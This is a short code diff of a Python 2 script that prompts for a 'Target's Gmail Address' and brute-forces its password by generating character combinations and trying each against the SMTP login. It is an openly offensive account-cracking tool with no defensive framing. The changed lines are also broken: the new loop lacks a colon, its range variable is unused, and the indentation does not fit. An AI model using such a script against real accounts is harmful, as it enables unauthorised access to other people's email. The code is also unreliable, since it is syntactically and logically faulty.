@@ -8,8 +8,9 @@ smtpserver.ehlo()
 smtpserver.starttls() 
 user = raw_input("Enter Target's Gmail Address: ") 
 
-perm = itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=12)
-password = ''.join(perm)
+for n in range(8,12):
+   for perm in itertools.product('abcdefghijklmnopqrstuvwxyz1234567890', repeat=12)
+      password = ''.join(perm)
          
 try: 
     smtpserver.login(user, password) 
